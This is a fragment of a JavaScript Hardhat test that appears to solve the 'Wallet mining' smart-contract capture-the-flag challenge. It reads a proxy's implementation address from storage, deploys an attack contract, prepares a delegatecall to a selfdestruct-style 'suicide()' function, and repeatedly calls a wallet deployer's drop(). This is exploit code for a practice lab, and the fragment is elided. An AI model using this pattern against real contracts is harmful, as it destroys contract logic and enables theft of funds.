...
describe("[Challenge] Wallet mining", function () {
  ...
  it("Execution", async function () {
    ...
    let implementationAddress =
      "0x" + (await ethers.provider.getStorageAt(attackAuthorizer.address, impSlot)).slice(-40)
    ...
    const attackContractFactory = await ethers.getContractFactory("WalletMiningAttack", player)
    const attackContract = await attackContractFactory.deploy()

    // Create ABI to delegate call attacking contract
    const attackABI = ["function suicide()"]
    const IAttack = createInterface(attackABI, "suicide", [])
    ...
    for (let i = 0; i < 43; i++) await (await attackWalletDeployer.drop(setupDummyABIData)).wait()
